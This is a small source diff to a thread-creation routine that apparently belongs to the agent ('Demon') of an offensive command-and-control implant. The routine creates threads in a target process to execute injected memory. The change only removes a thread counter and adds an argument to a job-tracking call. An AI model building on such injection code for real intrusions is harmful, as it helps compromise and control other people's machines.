@@ -128,9 +128,6 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
     NTSTATUS NtStatus = STATUS_SUCCESS;
     BOOL     Success  = FALSE;
 
-    if ( hProcess == NtCurrentProcess() )
-        Instance->Threads++;
-
     PackageAddInt32( Package, DEMON_INFO_MEM_EXEC );
     switch ( CreateThreadMethode )
     {
@@ -284,7 +281,7 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
         {
             if ( ctx->ThreadID != 0 )
             {
-                JobAdd( ctx->ThreadID, JOB_TYPE_THREAD, JOB_STATE_RUNNING, ctx->hThread );
+                JobAdd( ctx->ThreadID, JOB_TYPE_THREAD, JOB_STATE_RUNNING, ctx->hThread, NULL );
             }
         }
     }
